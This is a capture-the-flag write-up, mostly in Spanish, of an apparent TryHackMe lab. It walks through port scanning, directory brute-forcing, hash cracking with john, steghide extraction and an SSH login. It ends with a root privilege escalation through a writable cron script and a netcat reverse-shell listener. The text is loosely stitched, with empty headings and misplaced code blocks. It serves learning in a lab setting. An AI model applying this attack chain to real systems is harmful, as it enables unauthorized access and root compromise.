## Objetivo
## Pistas
## Solución

```
Hacemos un escaneo completo

┌──(kali㉿kali)-[~/Documents/Seguridad de redes/easy]
└─$ nmap 10.10.169.113 -sV -p- -v --min-rate 5000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-1
.....


PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.28 seconds


```

Hay 3 puertos
Version 1.16.1
Lo corre un apache

Using GoBuster, find flag 1.

usamos el got buster

```
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/easy]
└─$ gobuster dir -u http://10.10.169.113 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 100
 Y conforme nos de directorios vamos a otros

Llegamos a este directorio 
http://10.10.169.113/hidden/whatever/
Hay una imagen, vemos el codigo fuente 
tenemos esto
ZmxhZ3tmMXJzN19mbDRnfQ==
vamos al ciberchef
flag{f1rs7_fl4g}

```
Further enumerate the machine, what is flag 2?

Vamos al puerto 65524
luego al robots
http://10.10.169.113:65524/robots.txt
encontramos 
a18672860d0510e5ab6699730763b250

vamos aca
https://md5.gromweb.com/?md5=a18672860d0510e5ab6699730763b250


Crack the hash with easypeasy.txt, What is the flag 3?

Habia otro puerto, el 65524
Vamos a ver que hay
http://10.10.169.113:65524

What is the hidden directory?

Página diferente aquí. Revisé el código fuente y obtuve otro hash para descifrar. ¡John al rescate!

```
┌──(root㉿kali)-[~]  
  
$ echo "$MY-HASH" > hash  
$ john hash --wordlist=$downloaded-task-file-password.dic  
Warning: detected hash type "gost", but the string is also recognized as "HAVAL-256-3"  
Use the "--format=HAVAL-256-3" option to force loading these as that type instead  
Warning: detected hash type "gost", but the string is also recognized as "Panama"  
...  
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
mypasswordforthatjob (?)  
1g 0:00:00:00 DONE (2023-02-17 19:20) 50.00g/s 204800p/s 204800c/s 204800C/s mypasswordforthatjob..flash88  
Use the "--show" option to display all of the cracked passwords reliably

```

**8. Using the wordlist that provided to you in this task crack the hash  
what is the password?**

Explore hidden information in images

After downloaded the image on this weird path, I used [steghide](https://steghide.sourceforge.net/) to extract hidden information. For the passphrase I used the one extracted previously.
```

┌──(root㉿kali)-[~]  
  
$ steghide --extract -sf index.jpeg   
Enter passphrase: $PASSWORD-EXTRACTED-BEFORE  
wrote extracted data to "secrettext.txt".  
```


Hmmmm, interesting, a username and a password (for SSH?). Quickly went to cyberchef and retrieve the password.

**9. What is the password to login to the machine via SSH?**
```

After connecting through, ssh, I got a pretty dangerous message 👮

┌──(root㉿kali)-[~]  
  
$ ssh boring@$IP-ADDRESS -p 6498  
  
*************************************************************************  
**        This connection are monitored by government offical          **  
**            Please disconnect if you are not authorized        **  
** A lawsuit will be filed against you if the law is not followed      **  
*************************************************************************  
boring@10.10.102.202's password:   
You Have 1 Minute Before AC-130 Starts Firing  
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!  
You Have 1 Minute Before AC-130 Starts Firing  
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!  
  
User Flag But It Seems Wrong Like It`s Rotated Or Something  
synt{a0jvgf33zfa0ez4y}  
boring@kral4-PC:~$ exit  
logout

¡Vamos a ir rápido con esto! Desde el directorio principal, revisé el contenido del archivo user.txt. Sin embargo, encontré una sugerencia bastante interesante. Decía que la bandera estaba rotada (o algo así).

De “rotada” recuerdo rápidamente el cifrado césar de aprendizajes anteriores (gracias de nuevo, THM).

```

**10. What is the user flag?**
Por último, pero no por ello menos importante, faltaba una bandera raíz. Del último CTF creado, una de las cosas que verifico es el archivo que contiene todos los trabajos de cron. Este archivo se encuentra en /etc/crontab

```
┌──(root㉿kali)-[~]  
  
$ ssh boring@$IP-ADDRESS -p 6498  
  
...  
$ cat /etc/crontab  
# m h dom mon dow user command  
17 * * * * root    cd / && run-parts --report /etc/cron.hourly  
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )  
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )  
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
#  
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh






┌──(root㉿kali)-[~]  
  
# FROM THE ATTACK BOX  
$ nc -lvnp 4444  
Listening on [0.0.0.0] (family 0, port 4444)  
Connection from $IP 51612 received!  
bash: cannot set terminal process group (4279): Inappropriate ioctl for device  
bash: no job control in this shell  
root@kral4-PC:/var/www# whoami  
whoami  
root  
  
root@kral4-PC:/var/www# cd roo   
cd roo  
bash: cd: roo: No such file or directory  
root@kral4-PC:/var/www# cd root  
cd root  
bash: cd: root: No such file or directory  
root@kral4-PC:/var/www# ls  
ls  
html  
root@kral4-PC:/var/www# cd /root  
cd /root  
root@kral4-PC:~# ls -la  
ls -la  
total 40  
...  
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt  
root@kral4-PC:~# cat .root.txt  
cat .root.txt  
# VOILA!
```
## Notas adicionales
## Referencias